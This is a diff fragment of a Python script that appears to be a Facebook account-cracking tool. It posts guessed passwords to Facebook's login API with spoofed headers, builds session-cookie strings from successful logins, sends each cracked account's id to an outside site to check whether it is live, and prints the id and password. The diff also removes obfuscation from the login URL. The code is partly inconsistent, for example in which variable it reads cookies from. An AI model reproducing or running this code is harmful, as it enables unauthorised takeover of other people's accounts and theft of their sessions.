@@ -1767,11 +1767,12 @@ def m6(ids,pwv):
             'X-FB-Client-IP':'True',
             'X-FB-Server-Cluster':'True',
             'x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-            url = 'htt'+'ps://a'+'pi.face'+'book.com/auth/login'
+            url = 'https://api.facebook.com/auth/login'
             response = requests.post(url,data=info,headers=update)
             if response.status_code == 200:
               json_response = response.json()
-              if 'access_token' in json_response:
+              if json_response.get('status') == 'ok':
+               if 'access_token' in json_response:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
                 ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={cid}"
@@ -1788,7 +1789,7 @@ def m6(ids,pwv):
                 elif 'die' in res:
                         print(f'\r\r{rad}[{green}ATOM-NOV{rad}]{WHITE} {cid} {rad}▶︎ {WHITE}{pas}')
                         break
-              elif 'session_key' in json_response:
+               elif 'session_key' in json_response:
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);AJb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");kuki = f"sb={AJb};{ckkk}"
                 cid = str(q['uid'])
                 ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={cid}"
